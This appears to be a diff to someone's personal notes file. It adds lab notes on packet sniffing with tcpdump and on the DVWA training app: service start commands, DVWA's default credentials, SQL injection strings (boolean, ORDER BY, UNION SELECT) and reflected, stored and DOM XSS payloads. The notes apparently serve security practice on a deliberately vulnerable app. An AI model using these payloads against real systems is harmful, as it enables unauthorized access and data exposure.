@@ -1,5 +1,23 @@
 # remember
 cs:
+packet sniffing:
+python3 -m http.server 8080
+sudo tcpdump -i any -w capture.pcap port 8080
+dvwa:
+sudo service apache2 start
+sudo service mysql start
+Username: admin
+Password: password
+1' OR '1'='1
+1' ORDER BY 1-- -
+1' UNION SELECT database(),2-- -
+<script>alert('XSS')</script>
+Name:
+<h1>Hacked</h1>
+Message:
+<script>alert('Stored XSS')</script>
+URL bar add:
+#<script>alert('DOM XSS')</script>
 1)android:
 cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
 emulator -list-avds
